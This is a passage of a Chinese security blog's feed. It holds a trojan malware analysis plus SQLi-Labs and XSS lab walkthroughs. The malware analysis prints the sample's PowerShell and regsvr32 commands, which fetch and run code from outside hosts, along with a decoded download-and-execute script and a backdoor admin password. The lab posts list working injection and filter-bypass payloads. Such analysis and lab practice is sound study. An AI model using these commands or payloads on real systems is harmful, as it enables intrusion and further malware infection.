      <category term="间谍软件Pegasus" scheme="http://yoursite.com/tags/%E9%97%B4%E8%B0%8D%E8%BD%AF%E4%BB%B6Pegasus/"/>
    
  </entry>
  
  <entry>
    <title>木马病毒分析</title>
    <link href="http://yoursite.com/2019/07/20/%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/07/20/木马病毒分析/</id>
    <published>2019-07-20T07:31:59.000Z</published>
    <updated>2019-07-26T08:15:37.090Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>2个文件：<strong><code>down.exe</code></strong>和<strong><code>msinfo.exe</code></strong></p><p>主木马程序是 <code>msinfo.exe</code></p></blockquote><h2 id="msinfo-exe的基本信息"><a href="#msinfo-exe的基本信息" class="headerlink" title="msinfo.exe的基本信息"></a>msinfo.exe的基本信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件大小     ：4,887,552 字节  </span><br><span class="line">MD5         ：03A704D98634F761D090AEAD21C7256A  </span><br><span class="line">CRC32       ：676D51BC  </span><br><span class="line">File Name   ：C:\Documents **and** Settings\Administrator\桌面\system\msinfo.exe  </span><br><span class="line">Format      ：Portable executable **for** 80386 (PE)  </span><br><span class="line">文件版本     ：1.0.0.9</span><br></pre></td></tr></table></figure><p>并且加入了vmp壳</p><img src="/2019/07/20/木马病毒分析/tu1.png" title="图1"><p>放入od中运行，显示缺少2个dll文件 分别是<code>wpcap.dll</code>  <code>packet.dll</code>，这两个文件推测是<code>网路传输层</code>所需要的文件，可能与<code>木马联网下载</code>有关。</p><p>使用PEview查看<code>msinfo.exe</code>。虽然被加壳但是也能看到不止一个函数，查看发现有一些网址和地址，有可能是该木马联网下载的路径和位置。</p><img src="/2019/07/20/木马病毒分析/tu2.png" title="图2"><p>放入od中运行一段时间，发现资源管理器有1个<code>msinfo.exe</code>进程一直在运行。</p><img src="/2019/07/20/木马病毒分析/tu3.png" title="图3"><p>通过进程查看器发现该木马自动下载了3个文件。</p><img src="/2019/07/20/木马病毒分析/tu4.png" title="图4"><img src="/2019/07/20/木马病毒分析/tu5.png" title="图5"><p>有2个文件下载到<code>msinfo.exe</code>所在路径文件夹，一个文件下载到<code>C:\Program Files\Common Files</code>这个文件夹下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Common Files\xpwpd.dat  </span><br><span class="line">C:\Documents **and** Settings\Administrator\桌面\system\wpd.dat  </span><br><span class="line">C:\Documents **and** Settings\Administrator\桌面\system\csrs.exe</span><br></pre></td></tr></table></figure><img src="/2019/07/20/木马病毒分析/tu6.png" title="图6"><img src="/2019/07/20/木马病毒分析/tu7.png" title="图7"><h2 id="down-exe的基本信息"><a href="#down-exe的基本信息" class="headerlink" title="down.exe的基本信息"></a>down.exe的基本信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件大小     ：27,136 字节  </span><br><span class="line">MD5         ：AE173E8562F6BABACB8E09D0D6C29276  </span><br><span class="line">CRC32       ：C4F161E6  </span><br><span class="line">File Name   ：C:\Documents **and** Settings\Administrator\桌面\system\down.exe  </span><br><span class="line">Format      ：Portable executable **for** 80386 (PE)  </span><br><span class="line">文件版本     ：5.2.3790.3959</span><br></pre></td></tr></table></figure><p>没有加壳</p><img src="/2019/07/20/木马病毒分析/tu8.png" title="图8"><p>因为其源文件名为<code>CACLS.EXE</code>，我们可以在百度上找到这个文件：</p><img src="/2019/07/20/木马病毒分析/tu9.png" title="图9"><p>源文件和现在这个文件进行对比：</p><img src="/2019/07/20/木马病毒分析/tu10.png" title="图10"> <img src="/2019/07/20/木马病毒分析/tu11.png" title="图11"><p>可以看到，函数基本没有改变。用<code>ProcessMonitor</code>监视<code>down.exe</code>文件执行后的操作</p><img src="/2019/07/20/木马病毒分析/tu12.png" title="图12"><p>可以看到<code>down.exe</code>访问了系统存放用户密码的文件，并且有<code>修改hash</code>的操作，猜测是用来查询用户名，进行提权操作。</p><h2 id="对于下载文件的检测"><a href="#对于下载文件的检测" class="headerlink" title="对于下载文件的检测"></a>对于下载文件的检测</h2><p>之前<code>msinfo.exe</code>运行后自动下载了3个文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Common Files\xpwpd.dat  </span><br><span class="line">C:\Documents **and** Settings\Administrator\桌面\system\wpd.dat  </span><br><span class="line">C:\Documents **and** Settings\Administrator\桌面\system\csrs.exe</span><br></pre></td></tr></table></figure><p>首先用16进制文本编辑器打开<code>C:\Program Files\Common Files\xpwpd.dat</code> </p><img src="/2019/07/20/木马病毒分析/tu13.png" title="图13"><p>应该是个指路文件，<code>msinfo.exe</code>通过这个指路文件下载<code>wpd.dat</code>和<code>csrs.exe</code>这两个文件。</p><p>而<code>wpd.dat</code>文件通过16进制编辑器打开后是乱码</p><img src="/2019/07/20/木马病毒分析/tu14.png" title="图14"><p><code>csrs.exe</code>并未加壳，是一个用python写的，利用 <code>pyinstaller</code> 转成exe可执行文件的程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件名称 ：C:\Documents and Settings\Administrator\桌面\system\csrs.exe  </span><br><span class="line">文件大小 ：6466961 字节  </span><br><span class="line">文件版本 ：1.0.0.3  </span><br><span class="line">MD5     ：6B62B380B8B14B261C5BFDFE7B017CDD  </span><br><span class="line">CRC32   ：27F5D1F8</span><br></pre></td></tr></table></figure><img src="/2019/07/20/木马病毒分析/tu15.png" title="图15"><p>在<code>linux</code>中用 <code>python-exe-unpacker-master</code> 解压</p><img src="/2019/07/20/木马病毒分析/tu16.png" title="图16"><p>解压后的文件：</p><img src="/2019/07/20/木马病毒分析/tu17.png" title="图17"><h2 id="MyExploiter"><a href="#MyExploiter" class="headerlink" title="MyExploiter"></a>MyExploiter</h2><p>因为我们已经解压出来<code>csrs.exe</code>的文件，里面的<code>MyExploiter</code>是攻击文件的核心，我们将其后缀改为<code>.py</code>并打开这个文件。可以看到部分代码</p><img src="/2019/07/20/木马病毒分析/tu18.png" title="图18"><p>大概能看出来是利用ms17010漏洞进行攻击，对目标系统添加一个密码为Zxcvbnm.1234的管理员admin$账户，用于控制计算机，同时下载并安装更改了从云端下下来的dll库文件。如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://wmi.1217bye.host/S.ps1  powershell.exe IEX (New-Object system.Net.WebClient).  </span><br><span class="line">http://173.208.139.170/s.txt  powershell.exe IEX (New-Object system.Net.WebClient).    </span><br><span class="line">http://35.182.171.137/s.jpg  regsvr32 /u /s /i:    </span><br><span class="line">http://wmi.1217bye.host:8888/1.txt scrobj.dll®svr32 /u /s /i:    </span><br><span class="line">http://173.208.139.170/2.txt scrobj.dll®svr32 /u /s /i:    </span><br><span class="line">http://35.182.171.137/3.txt scrobj.dll&quot;    </span><br><span class="line">regsvr32 /s /u /n /i:http://173.208.172.202:8888\\s1.txt scrobj.dll</span><br></pre></td></tr></table></figure><h3 id="ms17010-攻击代码"><a href="#ms17010-攻击代码" class="headerlink" title="ms17010     攻击代码"></a><strong>ms17010</strong>     攻击代码</h3><p>在<code>PYZ-00.pyz_extracted</code>这个文件夹内有<code>569个.pyc</code>的文件，使用<code>uncompyle2-master</code>反汇编成<code>.py</code>文件。</p><p>其中有个名为<code>buleAttack</code>的文件，是选择不同操作系统进行攻击</p><img src="/2019/07/20/木马病毒分析/tu19.png" title="图19"><p><code>ms17010</code>攻击核心代码是在 <code>ExpMs17010.pyc</code>文件中，将其进行反编译：</p><img src="/2019/07/20/木马病毒分析/tu20.png" title="图20"><p>这是创建一个添加一个密码为Zxcvbnm.1234的管理员admin$账户。</p><img src="/2019/07/20/木马病毒分析/tu21.png" title="图21"><p>这是攻击参数，用于攻击</p><img src="/2019/07/20/木马病毒分析/tu22.png" title="图22"><p>还有从系统文件中获取<code>token</code>，用于提权</p><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a><strong>Powershell</strong></h3><p>发现<code>MyExploiter</code>中有一段<code>powershell</code></p><p>`</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBtAGkALgAxADIAMQA3AGIAeQBlAC4AaABvAHMAdAAvADIALgB0AHgAdAAnACkALgB0AHIAaQBtACgAKQAgAC0AcwBwAGwAaQB0ACAAJwBbAFwAcgBcAG4AXQArACcAfAAlAHsAJABuAD0AJABfAC4AcwBwAGwAaQB0ACgAJwAvACcAKQBbAC0AMQBdADsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAXwAsACAAJABuACkAOwBzAHQAYQByAHQAIAAkAG4AOwB9AA==&quot;&amp;powershell.e`</span><br></pre></td></tr></table></figure><p>对其进行解密，尝试了众多例如<code>md5</code>，<code>url</code>等加密解密。发现<code>Base64</code>解码有效：</p><img src="/2019/07/20/木马病毒分析/tu23.png" title="图23"><p>解密后为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$wc=New-Object System.Net.WebClient;  </span><br><span class="line">$wc.DownloadString(&apos;http://wmi.1217bye.host/2.txt&apos;).trim() -split &apos;[\r\n]+&apos;|%&#123;$n=$_.split(&apos;/&apos;)[-1];  </span><br><span class="line">$wc.DownloadFile($_, $n);start $n;&#125;</span><br></pre></td></tr></table></figure><p>打开powshell里的网站</p><img src="/2019/07/20/木马病毒分析/tu24.png" title="图24"><p>可以确定，<code>powshell</code>的作用是<code>下载后续木马</code>，对目标计算机进行<code>持续化恶意程序攻击</code>。</p><h2 id="后续恶意程序攻击"><a href="#后续恶意程序攻击" class="headerlink" title="后续恶意程序攻击"></a>后续恶意程序攻击</h2><h3 id="ok-exe"><a href="#ok-exe" class="headerlink" title="ok.exe"></a><strong>ok.exe</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">文件位置    ：C:\Documents and Settings\Administrator\桌面  </span><br><span class="line">文件大小    ：2,241,024 字节  </span><br><span class="line">文件描述    ：易语言程序  </span><br><span class="line">md5        ：9F86AFAE88B2D807A71F442891DFE3D4  </span><br><span class="line">crc32      ：9C3E3E23  </span><br><span class="line">Format     ：Portable executable **for** 80386 (PE)  </span><br><span class="line">版本信息    ：1.0.0.0</span><br></pre></td></tr></table></figure><p>发现有<code>vmp</code>壳</p><img src="/2019/07/20/木马病毒分析/tu25.png" title="图25"><p>通过<code>进程监视器</code>，发现该<code>ok.exe</code>修改了许多<code>内核级dll</code>。经过查找资料发现修改了<code>用户操作系统界面</code>。并且发现，有<code>修改windows内核文件</code>。</p><img src="/2019/07/20/木马病毒分析/tu26.png" title="图26"><p>还有对<code>操作系统设置</code>，<code>基本用户界面</code>等特性，如<code>创建窗口</code>和<code>发送消息</code>等功能进行修改。</p><img src="/2019/07/20/木马病毒分析/tu27.png" title="图27"><h3 id="u-exe"><a href="#u-exe" class="headerlink" title="u.exe"></a><strong>u.exe</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件位置    ：C:\Documents and Settings\Administrator\桌面\u.exe  </span><br><span class="line">文件大小    ：37,888 字节  </span><br><span class="line">md5        ：B89B37A90D0A080C34BBBA0D53BD66DF  </span><br><span class="line">crc32      ：C909DD40  </span><br><span class="line">文件版本    ：1.0.0.0</span><br></pre></td></tr></table></figure><p>有<code>upx</code>壳，使用<code>upx去壳器</code>去壳</p><img src="/2019/07/20/木马病毒分析/tu28.png" title="图28"><img src="/2019/07/20/木马病毒分析/tu29.png" title="图29"><p>将解压后的<code>exe文件</code>放入<code>IDA</code>中分析。首先找到<code>主函数main</code></p><img src="/2019/07/20/木马病毒分析/tu30.png" title="图30"><p>对找到<code>main</code> 中的各个函数，进行分析。</p><p>发现<code>sub_4031c0()</code>这是<code>建立一个连接到服务控制管理器并打开它的数据库</code>的函数，通过服务控制管理器<code>监视用户电脑的键盘读写</code>等操作</p><img src="/2019/07/20/木马病毒分析/tu31.png" title="图31"><p>发现<code>sub_401220()</code>这是个<code>修改dns</code>的函数</p><img src="/2019/07/20/木马病毒分析/tu32.png" title="图32"><img src="/2019/07/20/木马病毒分析/tu33.png" title="图33"><img src="/2019/07/20/木马病毒分析/tu34.png" title="图34"><p>将<code>DNS</code>修改为<code>223.5.5.5 8.8.8.8</code>  并且程序还有修改失败的后续操作；</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="网络攻防" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="木马分析" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="网络攻防" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="木马" scheme="http://yoursite.com/tags/%E6%9C%A8%E9%A9%AC/"/>
    
      <category term="病毒" scheme="http://yoursite.com/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>SQL-Labs</title>
    <link href="http://yoursite.com/2019/07/14/SQL-Labs/"/>
    <id>http://yoursite.com/2019/07/14/SQL-Labs/</id>
    <published>2019-07-14T14:46:42.000Z</published>
    <updated>2019-07-26T08:16:14.388Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h4 id="基于错误的GET单引号字符型注入"><a href="#基于错误的GET单引号字符型注入" class="headerlink" title="基于错误的GET单引号字符型注入"></a>基于错误的GET单引号字符型注入</h4><p><code>Id=1</code> 直接过了</p><h4 id="基于错误的GET整形注入"><a href="#基于错误的GET整形注入" class="headerlink" title="基于错误的GET整形注入"></a>基于错误的GET整形注入</h4><p><code>?id=1%20or%201=1%23</code></p><h4 id="基于错误的GET单引号变形字符型注入"><a href="#基于错误的GET单引号变形字符型注入" class="headerlink" title="基于错误的GET单引号变形字符型注入"></a>基于错误的GET单引号变形字符型注入</h4><p><code>?id=2&#39;) --+</code></p><h4 id="基于错误的GET双引号字符型注入"><a href="#基于错误的GET双引号字符型注入" class="headerlink" title="基于错误的GET双引号字符型注入"></a>基于错误的GET双引号字符型注入</h4><p><code>?id=3&quot;)%20--+</code></p><h4 id="双注入GET单引号字符型注入"><a href="#双注入GET单引号字符型注入" class="headerlink" title="双注入GET单引号字符型注入"></a>双注入GET单引号字符型注入</h4><p><code>?id=1&#39; and left(database(),1)=&#39;s&#39; --+</code></p><h4 id="双注入GET双引号字符型注入"><a href="#双注入GET双引号字符型注入" class="headerlink" title="双注入GET双引号字符型注入"></a>双注入GET双引号字符型注入</h4><p><code>?id=1&#39;’ and left(database(),1)=&#39;s&#39; --+</code></p><h4 id="导出文件GET字符型注入"><a href="#导出文件GET字符型注入" class="headerlink" title="导出文件GET字符型注入"></a>导出文件GET字符型注入</h4><p>​       <code>?id=5&#39;))  --+</code></p><p>​      </p><h4 id="布尔型单引号GET盲注"><a href="#布尔型单引号GET盲注" class="headerlink" title="布尔型单引号GET盲注"></a>布尔型单引号GET盲注</h4><p>​      <code>?id=2&#39; --+</code></p><p>​      </p><h4 id="基于时间的GET单引号盲注"><a href="#基于时间的GET单引号盲注" class="headerlink" title="基于时间的GET单引号盲注"></a>基于时间的GET单引号盲注</h4><p>​      <code>?id=1&#39; and if(ascii(substr(database(),1,1))=115,sleep(3),0 %23</code></p><h4 id="基于时间的双引号盲注"><a href="#基于时间的双引号盲注" class="headerlink" title="基于时间的双引号盲注"></a>基于时间的双引号盲注</h4><p>​      <code>?id=1&quot;andif(ascii(substr(database(),1,1))=115,sleep(3),0) %23</code></p><p>#### </p><p>尝试一下基本的：</p><p>username = admin’ or 1=1# </p><p>password = admin</p><p>发现登录成功，所以存在注入点。</p><p>查看一下有多少列，当试到3时报错，说明存在两列字段</p><p>username = admin’ or 1=1 order by 3#</p><p>12.第12关</p><p>这题和上一题基本一样，不同的是username用双引号加括号包裹。</p><p>admin”) or 1=1#</p><p>13.第13关</p><p>这题是单引号加括号闭合，但是输入payload时却没有回显，看来只能用盲注了。</p><p>username = admin’) or ascii(substr(database(),1,1))=115#</p><p>14.第14关</p><p>和Less-13一样，将单引号和括号改成双引号即可。</p><p>admin” or 1=1#</p><p>15.第15关</p><p>和上面一样，将payload改为单引号。</p><p>admin’ or 1=1#</p><p>16.第16关</p><p>admin”) or 1=1#</p><p>17.第17关</p><p>标题上面写的password reset，所以尝试一下在password一栏里面进行注入。</p><p>username = admin</p><p>password = admin’ or 1=1# </p><p>得到了正确的回显，说明方向正确。但是在猜测表的行列时出现了问题，无法显示有多少列。所以尝试一下布尔盲注。</p><p>username = admin</p><p>password = admin’ or ascii(substr(database(),1,1))=115#</p><p>得到了正确的回显。</p><p>18.第18关</p><p>首先我们抓包，可以看到本机的ip地址，查看源码</p><p>\1.  php  </p><p>\2.  $uagent = $_SERVER[‘HTTP_USER_AGENT’];  </p><p>\3.  $IP = $_SERVER[‘REMOTE_ADDR’];  </p><p>源码使用<code>HTTP_USER_AGENT</code>只获取了HTTP请求头的一个部分：<code>User-Agent</code>。</p><p> 而获取IP则使用了<code>REMOTE_ADDR</code>，这能直接获取TCP协议数据包的底层会话IP地址，它能被代理服务器或路由修改伪造，但非修改XFF头就可以更改的。用已知的用户名登陆一下，并且测试一下X-Forwarded-For和User-Agent。</p><p><img src="https://s2.ax1x.com/2019/03/07/kxQCX4.png" alt></p><p>经过这次尝试可以看到：修改XFF头对IP没有影响，登陆成功会回显你的<code>User-Agent</code>。</p><p> 这里要输入正确的账号和密码才能绕过账号密码判断，进入处理<code>User-Agent</code>部分。这跟现实中的注册登录再注入是比较贴合。所以注入点就在<code>User-Agent</code>处。</p><p>这里我们仍需要根据回显报错来判断<code>INSERT</code>语句结构，首先任意尝试：</p><p>User-Agent: ‘ updatexml(1,concat(‘#’,(database())),0)–+`</p><p>查看源码，我们可以看到<code>uagent</code>是在<code>IP</code>和<code>uname</code>之前的：</p><p>$insert=”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)”;</p><p>构造<code>payload</code></p><p>&lt;!–￼0–&gt;</p><p>1’ union select 1,2,3#</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">直接可以得到`1&apos; union select 1,2,database()#`</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">21.第21关</span><br><span class="line"></span><br><span class="line">上一关一样，输入用户名登录，uname=Dumb，passwd=Dumb，登陆之后，可以看到和上一关的很像，但是还是有差别的，`uname=Dumb`变成了`uname = RHVtYg==`</span><br><span class="line"></span><br><span class="line">明显这里是经过了base64加密后的数据。那么我们尝试在将值进行base64加密后输入。</span><br></pre></td></tr></table></figure><p>1’) union select 1,2,database()#<br>```</p><p>加密后：`base64:</p><p> RHVtcCcpIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSM=`</p><p>22.第22关</p><p>方法和上一关基本一致，闭合用双引号即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="网络攻防" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="网络攻防" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>XSS跨站脚本攻击</title>
    <link href="http://yoursite.com/2019/07/12/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2019/07/12/XSS跨站脚本攻击/</id>
    <published>2019-07-12T11:01:27.000Z</published>
    <updated>2019-07-26T08:15:59.595Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Test-1"><a href="#Test-1" class="headerlink" title="Test 1"></a>Test 1</h3><p>没有过滤，网页源码为</p><img src="/2019/07/12/XSS跨站脚本攻击/tu1.jpg" title="图1"><p>所以payload为: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu2.jpg" title="图2"><h3 id="Test-2"><a href="#Test-2" class="headerlink" title="Test 2"></a>Test 2</h3><p>网页源代码为：<img src="/2019/07/12/XSS跨站脚本攻击/tu3.jpg" title="图3"></p><p>发现红框框起来的部分，需要闭合之前的尖括号和双引号，才能引起弹窗，达成跨站脚本攻击。</p><p>所以 payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu4.jpg" title="图4"><h3 id="Test-3"><a href="#Test-3" class="headerlink" title="Test 3"></a>Test 3</h3><p>网页源代码：</p><img src="/2019/07/12/XSS跨站脚本攻击/tu5.jpg" title="图5"><p>网页源码中，红框部分为主要部分，用了<code>htmlspecialchars()</code>函数。该函数的作用是将<code>&lt;</code> <code>&gt;</code> <code>/</code> <code>“</code> <code>“</code> <code>‘</code> <code>‘</code>这些符号进行转义，并且2处都进行了转义，所以我们使用html事件属性。</p><p>我们使用鼠标事件来引起xss弹窗。但是我们首先要闭合之前的单引号。</p><p>所以payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onmouseover=&apos;alert(2333)   这时我们把鼠标移到搜索框附近就会引起弹窗，攻击成功</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu6.jpg" title="图6">)<h3 id="Test-4"><a href="#Test-4" class="headerlink" title="Test 4"></a>Test 4</h3><p>与上一关不同的是，出现的第一处发生了<code>htmlspecialchars()</code>转义，第二处过滤了<code>&lt;</code>和<code>&gt;</code>两个符号（替换成空），并将<code>value=</code>后面的单引号换成了双引号。这样我们直接将上题Payload 中单引号换成双引号，最后鼠标滑过触发XSS 。</p><img src="/2019/07/12/XSS跨站脚本攻击/tu7.jpg" title="图7"><p>所以payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">”nmouseover=”lert(2333)</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu8.jpg" title="图8"><h3 id="Test-5"><a href="#Test-5" class="headerlink" title="Test 5"></a>Test 5</h3><p>查看网页源代码发现on中间插入下划线_ ，并且发现<code>script</code>也被过滤，所以我们用<code>html</code>链接形式触发xss。首先我们闭合双引号，其次闭合尖括号；然后我们用链接触发xss。</p><img src="/2019/07/12/XSS跨站脚本攻击/tu9.jpg" title="图9"><p>所以payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(123)&quot;&gt; 然后点击。便可触发</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu10.jpg" title="图10"><h3 id="Test-6"><a href="#Test-6" class="headerlink" title="Test 6"></a>Test 6</h3><p>首先我们用上次的payload尝试，发现不可行。查看网页源代码，发现有很多关键词都加入了下划线_ 进行了屏蔽，但是查看网页源码，发现我们之前填写的payload并没有被大小写统一，所以我们可以用大小写混用绕过屏蔽。</p><img src="/2019/07/12/XSS跨站脚本攻击/tu11.jpg" title="图11"><p><img src="file:///C:/Users/5454/AppData/Local/Temp/msohtmlclip1/01/clip_image024.jpg" alt="img"></p><p>所以payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hRef=&quot;javascript:alert(123)&quot;&gt; 并点击，便能触发xss</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu12.jpg" title="图12"><h3 id="Test-7"><a href="#Test-7" class="headerlink" title="Test 7"></a>Test 7</h3><p>用之前的payload，发现并不能，然后查看网页源码。发现许多关键字被屏蔽了，并且被替换成空。我们可使用双写绕过，使得替换后的结果是我们所期望的。首先闭合双引号和尖括号，其次双写绕过。</p><img src="/2019/07/12/XSS跨站脚本攻击/tu13.jpg" title="图13">)<p>所以payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef=&quot;javascrscriptipt:alert(123)&quot;&gt; 然后点击，触发弹窗</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu14.jpg" title="图14">)<h3 id="Test-8"><a href="#Test-8" class="headerlink" title="Test 8"></a>Test 8</h3><p>算了，不尝试之前的payload了，反正就没对过，直接看网页源码吧。</p><img src="/2019/07/12/XSS跨站脚本攻击/tu15.jpg" title="图15">)<p>发现几乎所有关键字都被加了下划线_ 都被屏蔽，我们可以使用<code>Unicode</code>编码绕过。</p><p>Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(123) 然后点击友情链接，便可以触发xss弹窗。</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu16.jpg" title="图16"><h3 id="Test-9"><a href="#Test-9" class="headerlink" title="Test 9"></a>Test 9</h3><p>尝试之前的payload，发现404了，并为触发弹窗，攻击失败。查看源码，发现多了一个<code>if</code>判断语句。判断内容是是否含有<code>http://</code>，如果没有，就会显示连接不合法之类的。我们可以使用注释绕过</p><img src="/2019/07/12/XSS跨站脚本攻击/tu17.jpg" title="图17"><p>所以payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(123)/*http://*/</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu20.jpg" title="图18"><h3 id="Test-10"><a href="#Test-10" class="headerlink" title="Test 10"></a>Test 10</h3><p>查看网页源码，发现有许多<code>hidden</code>隐藏项，我们可以利用<code>sort</code>函数，并且利用<code>html</code>事件触发来触发xss。</p><img src="/2019/07/12/XSS跨站脚本攻击/tu19.jpg" title="图19"><p>所以 payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=&quot; onmouseover=&quot;alert(123)&quot; type=&quot;text</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu20.jpg" title="图20">]]></content>
    
    <summary type="html">
    
      
      
